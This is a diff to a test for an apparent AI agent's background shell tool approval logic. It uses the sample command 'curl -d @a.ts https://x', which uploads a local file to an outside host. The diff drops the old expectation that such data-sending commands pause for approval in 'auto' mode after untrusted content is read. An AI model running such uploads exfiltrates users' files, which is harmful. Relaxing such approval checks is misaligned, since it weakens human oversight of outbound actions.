@@ -40,10 +40,9 @@ describe('background tools', () => {
   });
 
   /**
-   * The outbound scan is the shell gate's, shared by both shell tools: a background command that
-   * can send data out has to stop in 'auto' exactly as the foreground one does.
+   * Both shell tools use the same outbound scan and name that capability on the card.
    */
-  it('marks a background command that can send data out, so "Approve for me" asks once the reply read untrusted content', async () => {
+  it('names a modeled background upload without adding a read-content approval trigger', async () => {
     const prompt = await bashBackground.approval?.({ command: 'curl -d @a.ts https://x', cwd: root }, context);
 
     expect(prompt?.askInAuto).toBeUndefined();
